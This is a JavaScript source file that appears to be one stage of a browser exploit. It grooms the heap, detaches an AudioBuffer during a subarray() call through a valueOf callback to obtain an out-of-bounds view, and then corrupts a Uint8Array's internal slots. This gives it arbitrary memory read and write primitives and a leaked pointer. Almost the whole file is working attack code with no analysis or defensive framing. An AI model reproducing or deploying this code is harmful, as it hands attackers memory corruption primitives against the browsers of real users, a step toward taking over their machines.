function NeuterRW() {
  this.Init();
  this.Groom();
  this.Trigger();
  this.SetupRW();
  this.GetLeakedPtr();
}

NeuterRW.prototype.Configuration = function() {
  this.num_arraybuffers = 10000;
  this.num_audiobuffers = 10;
  this.num_views        = 500000;
  this.view_size        = 0x100000;
  this.magic_offset     = Math.floor(Math.random() * 0x100000);
  this.magic_length     = this.view_size - this.magic_offset;
  this.oob_size         = 0x100000;
  this.oob_size_u32     = this.oob_size / 4;
}

NeuterRW.InstallSlots = function() {
  if (platform.Is64BitBrowser()) {
    NeuterRW.prototype.TypeSlot       =  2;
    NeuterRW.prototype.ByteOffsetSlot =  8;
    NeuterRW.prototype.ByteLengthSlot = 10;
    NeuterRW.prototype.LengthSlot     = 18;
    NeuterRW.prototype.DataSlot       = 22;
    NeuterRW.prototype.TotalSlots     = 24;
  } else {
    NeuterRW.prototype.TypeSlot       =  1;
    NeuterRW.prototype.ByteOffsetSlot =  4;
    NeuterRW.prototype.ByteLengthSlot =  6;
    NeuterRW.prototype.LengthSlot     = 14;
    NeuterRW.prototype.DataSlot       = 18;
    NeuterRW.prototype.TotalSlots     = 20;
  }
}

NeuterRW.prototype.Init = function() {
  this.conf = new this.Configuration();
  this.audio_context = new AudioContext();
  this.InstallTypes();
}

NeuterRW.prototype.InstallTypes = function() {
  this.type_object_type = {
    kind: 'struct',
    fields: {
      clasp: {offset: 0, type: Variable.Pointer},
    },
  }
}

NeuterRW.prototype.Groom = function() {
  var conf = this.conf;
  this.unused = [];
  this.views = [];
  this.buffer_for_views = new ArrayBuffer(conf.view_size);
  for (var i = 0; i < conf.num_arraybuffers; i++)
    this.unused.push(new ArrayBuffer(1));
  for (var i = 0; i < conf.num_audiobuffers; i++)
    this.unused.push(this.audio_context.createBuffer(1, conf.oob_size_u32, 96000));
  for (var i = 0; i < conf.num_views; i++)
    this.views.push(new Uint8Array(this.buffer_for_views, conf.magic_offset, conf.magic_length));
  this.audio_buffer = this.unused.pop();
}

NeuterRW.prototype.EndValue = function(conf, NeuterCallback) {
  this.conf = conf;
  this.NeuterCallback = NeuterCallback;
}

NeuterRW.prototype.EndValue.prototype.valueOf = function() {
  this.NeuterCallback();
  return this.conf.oob_size_u32;
}

NeuterRW.prototype.NeuterAudioBuffer = function() {
  var convolver = this.audio_context.createConvolver();
  convolver.buffer = this.audio_buffer;
}

NeuterRW.prototype.Trigger = function() {
  end = new this.EndValue(this.conf, this.NeuterAudioBuffer.bind(this));
  var view_f32 = this.audio_buffer.getChannelData(0);
  var array_buffer = view_f32.buffer;
  var view_u32_tmp = new Uint32Array(array_buffer);
  this.oob = view_u32_tmp.subarray(0, end);
  Log('[+] Got OOB block');
}

NeuterRW.prototype.FindAnyUint8Array = function() {
  var found = false;
  for (var i = 0; i < this.oob.length; i++) {
    if (this.oob[i + this.ByteOffsetSlot] == this.conf.magic_offset &&
        this.oob[i + this.ByteLengthSlot] == this.conf.magic_length) {
      found = true;
      Log('[+] Found Uint8Array');
      break;
    }
  }
  Check(found, 'Bad grooming, no TypedArrayObject after ArrayBufferObject');
  return i;
}

NeuterRW.prototype.IdentifyUint8Array = function() {
  this.oob[this.SlotOffset(this.ByteOffsetSlot)]--;
  var found = false;
  for (var i = 0; i < this.views.length; i++) {
    if (this.views[i].byteOffset == this.conf.magic_offset - 1) {
      found = true;
      Log('[+] Identified Uint8Array');
      break;
    }
  }
  Check(found, 'Huh, can\'t find the modified view');
  return this.views[i];
}

NeuterRW.prototype.SetupRW = function() {
  this.rw_view_slots = this.FindAnyUint8Array();
  this.rw_view = this.IdentifyUint8Array();
}

NeuterRW.prototype.SlotOffset = function(slot) {
  return this.rw_view_slots + slot;
}

NeuterRW.prototype.WritePointerSlot = function(slot, pointer) {
  var offset = this.SlotOffset(slot);
  this.oob[offset] = pointer.Low();
  if (platform.Is64BitBrowser())
    this.oob[offset + 1] = pointer.High();
}

NeuterRW.prototype.ReadPointerSlot = function(slot) {
  var offset = this.SlotOffset(slot);
  var pointer = Num(this.oob[offset]);
  if (platform.Is64BitBrowser())
    pointer.SetHigh(this.oob[offset + 1]);
  return pointer;
}

NeuterRW.prototype.GetLeakedPtr = function() {
  var type_address = this.ReadPointerSlot(this.TypeSlot);
  var type = new Variable(this, type_address, this.type_object_type);
  this.leaked_ptr = type.clasp.Read();
  Log('[+] Leaked pointer ' + this.leaked_ptr.toString());
}

NeuterRW.prototype.SetAddress = function(address) {
  this.WritePointerSlot(this.DataSlot, address);
}

NeuterRW.prototype.ReadU8 = function(address) {
  this.SetAddress(address);
  return this.rw_view[0];
}

NeuterRW.prototype.WriteU8 = function(address, value) {
  this.SetAddress(address);
  this.rw_view[0] = value;
}

NeuterRW.prototype.LeakPtr = function() {
  return this.leaked_ptr;
}

